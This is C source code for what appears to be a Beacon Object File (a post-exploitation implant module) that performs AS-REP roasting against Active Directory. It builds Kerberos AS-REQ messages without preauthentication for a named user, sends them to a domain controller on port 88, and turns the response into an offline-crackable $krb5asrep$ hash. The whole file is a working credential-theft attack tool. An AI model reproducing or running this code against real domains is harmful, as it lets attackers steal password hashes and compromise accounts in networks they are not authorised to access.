#include "_include/functions.c"
#include "_include/asn_decode.c"
#include "_include/asn_encode.c"
#include "_include/connection.c"

BOOL NewAS_REP(AsnElt asn_AS_REP, AS_REP* as_rep) {
    // AS-REP::= [APPLICATION 11] KDC-REQ
    if ((asn_AS_REP.subCount != 1) || (asn_AS_REP.sub[0].tagValue != 16)) {
        PRINT_OUT("First AS-REP sub should be a sequence");
        return TRUE;
    }

    AsnElt* kdc_rep = asn_AS_REP.sub[0].sub;

    for (int i = 0; i < asn_AS_REP.sub[0].subCount; i++) {
        int tagValue = kdc_rep[i].tagValue;
        if ( tagValue == 0 ) {
            if (AsnGetInteger(&(kdc_rep[i].sub[0]), &(as_rep->pvno))) return TRUE;
        }
        if ( tagValue == 1 ) {
            if (AsnGetInteger(&(kdc_rep[i].sub[0]), &(as_rep->msg_type)))return TRUE;
        }
        if ( tagValue == 2 ) {
            as_rep->pa_data_count = kdc_rep[i].subCount;
            as_rep->pa_data = MemAlloc(as_rep->pa_data_count);
            for (int j = 0; j < as_rep->pa_data_count; j++) {
                PA_DATA padata = { 0 };
                if (AsnGetPaData(&(kdc_rep[i].sub[j].sub[0]), &padata)) return TRUE;
                as_rep->pa_data[j] = padata;
            }
        }
        if ( tagValue == 3 ) {
            if (AsnGetString(&(kdc_rep[i].sub[0]), &(as_rep->crealm))) return TRUE;
        }
        if ( tagValue == 4 ) {
            if (AsnGetPrincipalName(&(kdc_rep[i].sub[0]), &(as_rep->cname))) return TRUE;
        }
        if ( tagValue == 5 ) {
            if (kdc_rep[i].sub[0].subCount)
                if (AsnGetTicket(&(kdc_rep[i].sub[0].sub[0]), &(as_rep->ticket))) return TRUE;
        }
        if ( tagValue == 6 ) {
            if (AsnGetEncryptedData(&(kdc_rep[i].sub[0]), &(as_rep->enc_part))) return TRUE;
        }
    }
    kdc_rep = NULL;
    return FALSE;
}

BOOL NewAS_REQ_ROAST(char* pcUsername, char* pcDomain, int etype, AS_REQ* as_req) {
    as_req->pvno = 5;
    as_req->msg_type = KERB_AS_REQ;

    as_req->req_body.kdc_options = FORWARDABLE | RENEWABLE | RENEWABLEOK;
    as_req->req_body.till = 1 * 3600;    // valid for 1h
    ADVAPI32$SystemFunction036(&(as_req->req_body.nonce), 4);

    if (my_copybuf(&as_req->req_body.realm, pcDomain, my_strlen(pcDomain) + 1)) return TRUE;

    as_req->req_body.cname.name_type = PRINCIPAL_NT_PRINCIPAL;
    as_req->req_body.cname.name_count = 1;
    as_req->req_body.cname.name_string = MemAlloc(sizeof(void*) * as_req->req_body.cname.name_count);
    if (!as_req->req_body.cname.name_string) {
        PRINT_OUT("[x] Failed alloc memory");
        return TRUE;
    }
    if (my_copybuf(&(as_req->req_body.cname.name_string[0]), pcUsername, my_strlen(pcUsername) + 1)) return TRUE;

    as_req->req_body.sname.name_type = PRINCIPAL_NT_SRV_INST;
    as_req->req_body.sname.name_count = 2;
    as_req->req_body.sname.name_string = MemAlloc(sizeof(void*) * as_req->req_body.cname.name_count);
    if (my_copybuf(&(as_req->req_body.sname.name_string[0]), "krbtgt", 7)) return TRUE;
    if (my_copybuf(&(as_req->req_body.sname.name_string[1]), pcDomain, my_strlen(pcDomain) + 1)) return TRUE;

    as_req->pa_data_count = 1;
    as_req->pa_data = MemAlloc(sizeof(PA_DATA) * as_req->pa_data_count);
    if (!as_req->pa_data) {
        PRINT_OUT("[x] Failed alloc memory");
        return true;
    }

    as_req->pa_data[0].type = PADATA_PA_PAC_REQUEST;
    as_req->pa_data[0].value = MemAlloc(sizeof(KERB_PA_PAC_REQUEST));
    if (!as_req->pa_data[0].value) {
        PRINT_OUT("[x] Failed alloc memory");
        return true;
    }
    ((KERB_PA_PAC_REQUEST*)as_req->pa_data[0].value)->include_pac = 1;

    as_req->req_body.etypes_count = 1;
    as_req->req_body.etypes = MemAlloc(sizeof(int) * as_req->req_body.etypes_count);
    as_req->req_body.etypes[0] = etype;

    return FALSE;
}

void GetASRepHash(char* userName, char* domain, char* domainController, BOOL aesEType) {
    PRINT_OUT("[*] Building AS-REQ (w/o preauth) for: '%s\\%s'\n\n", domain, userName);

    AsnElt responseAsnMain = { 0 };
    int requestedEType;

    if (aesEType) {
        PRINT_OUT("[*] Requesting AES128 as the encryption type\n");

        AS_REQ AuthASREQ = { 0 };
        if (NewAS_REQ_ROAST(userName, domain, aes128_cts_hmac_sha1, &AuthASREQ)) return;

        AsnElt requestAsn = { 0 };
        if (ReqToAsnEncode(AuthASREQ, 10, &requestAsn)) return;

        int reqBytesSize = 0;
        byte* reqBytes = 0;
        if (AsnToBytesEncode(&requestAsn, &reqBytesSize, &reqBytes)) return;

        byte* response = NULL;
        int responseSize = 0;
        sendBytes(domainController, "88", reqBytes, reqBytesSize, &response, &responseSize);
        if (responseSize == 0)
            return;

        requestedEType = aes128_cts_hmac_sha1;

        AsnElt responseAsn = { 0 };
        if (BytesToAsnDecode3(response, responseSize, FALSE, &responseAsn)) return;

        if (responseAsn.tagValue == KERB_ERROR) {
            uint error_code = 0;
            if (AsnGetErrorCode(&(responseAsn.sub[0]), &error_code)) return;

            if (error_code == 14) {
                PRINT_OUT("[*] AES128 is not supported, attempting AES256 next\n");

                AS_REQ AuthASREQ2 = { 0 };
                if (NewAS_REQ_ROAST(userName, domain, aes256_cts_hmac_sha1, &AuthASREQ2)) return;

                AsnElt requestAsn2 = { 0 };
                if (ReqToAsnEncode(AuthASREQ2, 10, &requestAsn2)) return ;

                int reqBytesSize2 = 0;
                byte* reqBytes2 = 0;
                if (AsnToBytesEncode(&requestAsn2, &reqBytesSize2, &reqBytes2)) return;

                byte* response2 = NULL;
                int responseSize2 = 0;
                sendBytes(domainController, "88", reqBytes2, reqBytesSize2, &response2, &responseSize2);
                if (responseSize2 == 0)
                    return;

                requestedEType = aes256_cts_hmac_sha1;

                if (BytesToAsnDecode3(response2, responseSize2, FALSE, &responseAsnMain)) return;
            }
        }
        else {
            responseAsnMain = responseAsn;
        }
    }
    else {
        AS_REQ AuthASREQ = { 0 };
        if (NewAS_REQ_ROAST(userName, domain, rc4_hmac, &AuthASREQ)) return;

        AsnElt requestAsn = { 0 };
        if (ReqToAsnEncode(AuthASREQ, 10, &requestAsn)) return;

        int reqBytesSize = 0;
        byte* reqBytes = 0;
        if (AsnToBytesEncode(&requestAsn, &reqBytesSize, &reqBytes)) return;

        byte* response = NULL;
        int responseSize = 0;
        sendBytes(domainController, "88", reqBytes, reqBytesSize, &response, &responseSize);
        if (responseSize == 0)
            return;

        requestedEType = rc4_hmac;

        if (BytesToAsnDecode3(response, responseSize, FALSE, &responseAsnMain)) return;
    }

    if (responseAsnMain.tagValue == KERB_AS_REP) {
        PRINT_OUT("[+] AS-REQ w/o preauth successful!\n");

        AS_REP rep = { 0 };
        if (NewAS_REP(responseAsnMain, &rep)) return;
        int usernameLength = my_strlen(userName);
        int domainLength = my_strlen(domain);
        int hashStringLength = 18 + usernameLength + domainLength + rep.enc_part.cipher_size * 2;
        char* hashString = MemAlloc(hashStringLength);

        if (requestedEType == aes128_cts_hmac_sha1 || requestedEType == aes256_cts_hmac_sha1) {
            MemCpy(hashString, "$krb5asrep$17$", 14);
            MemCpy(hashString + 14, userName, usernameLength);
            hashString[14 + usernameLength] = '$';
            MemCpy(hashString + 15 + usernameLength, domain, domainLength);
            hashString[15 + usernameLength + domainLength] = '$';
            char* c1 = hashString + 16 + usernameLength + domainLength;
            my_tohex(rep.enc_part.cipher + rep.enc_part.cipher_size - 12, 12, &c1, 25);
            hashString[16 + usernameLength + domainLength + 24] = '$';
            char* c2 = hashString + 17 + usernameLength + domainLength + 24;
            my_tohex(rep.enc_part.cipher, rep.enc_part.cipher_size - 12, &c2, (rep.enc_part.cipher_size - 12) * 2 + 1);

            if (requestedEType == aes256_cts_hmac_sha1)
                hashString[12] = '8';
        }
        else {
            MemCpy(hashString, "$krb5asrep$23$", 14);
            MemCpy(hashString + 14, userName, usernameLength);
            hashString[14 + usernameLength] = '@';
            MemCpy(hashString + 15 + usernameLength, domain, domainLength);
            hashString[15 + usernameLength + domainLength] = ':';
            char* c1 = hashString + 16 + usernameLength + domainLength;
            my_tohex(rep.enc_part.cipher, 16, &c1, 33);
            hashString[16 + usernameLength + domainLength + 32] = '$';
            char* c2 = hashString + 17 + usernameLength + domainLength + 32;
            my_tohex(rep.enc_part.cipher + 16, rep.enc_part.cipher_size - 16, &c2, (rep.enc_part.cipher_size - 16) * 2 + 1);
        }
        PRINT_OUT("[*] AS-REP hash:\n      %s\n", hashString);
    }
    else if (responseAsnMain.tagValue == KERB_ERROR) {
        uint error_code = 0;
        if (AsnGetErrorCode(&(responseAsnMain.sub[0]), &error_code)) return;
        PRINT_OUT("\n\t[x] Kerberos error : %d\n", error_code);
//        PRINT_OUT("\n\t[x] Kerberos error : %s\n", lookupKrbErrorCode(error_code));
    }
    else {
        PRINT_OUT("\n[X] Unknown application tag: %d\n", responseAsnMain.tagValue);
    }
}

void ASREPROAST_RUN( PCHAR Buffer, DWORD Length ) {
    PRINT_OUT("[*] Action: AS-REP roasting\n");

    char* dc     = NULL;
    char* user   = NULL;
    char* domain = NULL;
    BOOL  aes    = FALSE;

    for (int i = 0; i < Length; i++) {
        i += GetStrParam(Buffer + i, Length - i, "/dc:", 4, &dc);
        i += GetStrParam(Buffer + i, Length - i, "/user:", 6, &user);
        i += GetStrParam(Buffer + i, Length - i, "/domain:", 8, &domain);
        i += IsSetParam(Buffer + i, Length - i, "/aes", 4, &aes );
    }

    GetDomainInfo(&domain, &dc);
    if (domain == NULL || dc == NULL) {
        PRINT_OUT("[X] Could not retrieve domain information!\n\n");
        return;
    }

    if (user == NULL) {
        PRINT_OUT("[X] You must supply a user name!\n\n");
        return;
    }

    PRINT_OUT("[*] Target User            : %s\n", user);
    PRINT_OUT("[*] Target Domain          : %s\n", domain);
    PRINT_OUT("[*] Target DC              : %s\n", dc);

    GetASRepHash(user, domain, dc, aes);
}

VOID go( IN PCHAR Buffer, IN ULONG Length ) {
    INIT_BOF();

    datap parser;
    BeaconDataParse(&parser, Buffer, Length);
    DWORD PARAM_SIZE = 0;
    PBYTE PARAM = BeaconDataExtract(&parser, &PARAM_SIZE);

    if( LoadFunc() )
        PRINT_OUT("%s\n", "Modules not loaded");
    else
        ASREPROAST_RUN( PARAM, PARAM_SIZE );

    FreeBank();

    END_BOF();
}